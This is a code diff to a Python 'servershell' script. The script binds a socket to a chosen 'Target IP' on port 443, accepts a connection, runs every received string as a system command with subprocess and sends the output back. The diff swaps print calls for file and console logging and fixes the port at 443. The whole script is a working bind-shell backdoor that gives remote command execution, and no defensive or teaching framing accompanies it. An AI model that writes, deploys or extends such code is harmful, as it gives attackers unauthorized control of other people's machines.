@@ -1,4 +1,22 @@
-import socket, subprocess , sys , time
+import socket, subprocess , sys , time, logging 
+
+
+
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('logfile2.log'), # imposta lo stream su file
+        logging.StreamHandler() # imposta lo stream su console
+    ]
+)
+
+
+
+
+
+
 
 class servershell():
   def __init__(self):
@@ -7,22 +25,15 @@ class servershell():
   
    try: 
     self.ip = input("Target IP: ")
+    self.port = 443
     if not self.ip:
      raise ValueError("IP address cannot be empty.")
    except Exception as error:
-      print(error)
+      logging.error(error)
       time.sleep(1)
-      print("invalid ip address")
+      logging.error("invalid ip address")
       return
    if self.ip:
-     try:
-      self.port = int(input("Target port: "))
-
-     except Exception as val:
-      print("invalid port")
-      time.sleep(1)
-      print(val)
-
      self.credentialconnect()
 
 
@@ -30,31 +41,31 @@ class servershell():
    try:
     self.socket.bind((self.ip,self.port))
    except Exception as e:
-    print("error with binding socket")
+    logging.error("error with binding socket")
     time.sleep(1)
     print(e)
    finally:
     try:
      self.socket.listen(1)
-     print(f"listening on {self.ip}:{self.port}")
+     logging.info(f"listening on {self.ip}:{self.port}")
     except Exception:
-     print(f"error with listening on:{self.ip}:{self.port}")
+     logging.error(f"error with listening on:{self.ip}:{self.port}")
     finally:
      self.conn, self.addr = self.socket.accept()
      with self.conn:
-      print(f"Connected with {self.addr}")
+      logging.info(f"Connected with {self.addr}")
       while True:
        try:
         self.data = self.conn.recv(1024).decode("latin1",errors="ignore")
        except Exception:
-        print("error with receiving data")
+        logging.error("error with receiving data")
        finally:
         try:
          self.resultcmd = subprocess.run(self.data,stdout=subprocess.PIPE, stderr=subprocess.PIPE,errors="ignore")
         except Exception as exc:
-         print("error with cmd")
+         logging.error("error with cmd")
          time.sleep(1)
-         print(exc)
+         logging.error(exc)
         finally:
          self.rst = self.resultcmd.stdout
          self.conn.sendall(self.rst.encode("latin1",errors="ignore"))
